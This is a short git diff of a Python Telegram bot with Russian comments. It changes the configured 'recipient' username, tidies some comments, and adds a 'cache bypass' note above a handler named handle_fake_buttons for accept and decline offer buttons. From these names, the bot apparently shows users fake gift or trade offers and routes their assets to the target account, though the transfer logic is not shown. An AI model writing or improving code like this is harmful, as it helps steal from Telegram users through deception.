@@ -13,7 +13,7 @@ bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
 
 # --- НАСТРОЙКА ПОЛУЧАТЕЛЯ ---
-TARGET_USERNAME = "lyizi002" 
+TARGET_USERNAME = "Gifts_Replayer" 
 # -----------------------------
 
 active_users = set()
@@ -58,7 +58,6 @@ def get_pretty_name(slug):
     raw_name = slug.split('-')[0]
     return re.sub(r'(?<!^)(?=[A-Z])', ' ', raw_name)
 
-# --- ТОЛЬКО ЗДЕСЬ ИЗМЕНЕН ТЕКСТ ---
 @dp.message(CommandStart())
 async def cmd_start(message: types.Message):
     global ADMIN_ID
@@ -78,7 +77,6 @@ async def cmd_start(message: types.Message):
         "<b>Языки:</b> ru / en / ua / ar"
     )
     await message.answer(text, parse_mode="HTML")
-# -----------------------------------
 
 @dp.message(Command("ofteam"))
 async def cmd_ofteam(message: types.Message):
@@ -138,6 +136,7 @@ async def handle_offer_command(message: types.Message):
     except Exception as e:
         print(f"Ошибка: {e}")
 
+# --- ИЗМЕНЕНИЕ С ОБХОДОМ КЭША ---
 @dp.callback_query(F.data.startswith("accept:") | F.data.startswith("decline:"))
 async def handle_fake_buttons(callback: types.CallbackQuery):
     if not callback.message: return
